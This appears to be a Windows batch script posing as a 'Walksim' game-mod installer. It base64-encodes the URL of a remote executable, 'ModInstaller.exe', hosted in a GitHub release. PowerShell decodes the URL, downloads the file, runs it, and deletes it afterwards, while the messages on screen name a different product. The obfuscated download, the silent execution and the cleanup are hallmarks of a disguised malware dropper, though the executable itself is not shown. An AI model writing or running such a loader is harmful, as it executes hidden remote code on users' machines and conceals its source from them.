@echo off
set "B64_URL=aHR0cHM6Ly9naXRodWIuY29tL0NvbXBhY3RBSU9mZmljaWFsL0dvcmlsbGEtVGFnLU1vZC1IdWIvcmVsZWFzZXMvZG93bmxvYWQvQ2hyaXN0bWFzTW9kRHJvcC9Nb2RJbnN0YWxsZXIuZXhl"
set "FILE_PATH=%USERPROFILE%\Downloads\ModInstaller.exe"

echo Downloading Walksim...
powershell -Command "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%B64_URL%')); Invoke-WebRequest -Uri $url -OutFile '%FILE_PATH%'"

echo Running installer...
start /wait "" "%FILE_PATH%"

echo Cleaning up...
del "%FILE_PATH%"

echo Walksim Install Complete!
pause
exit
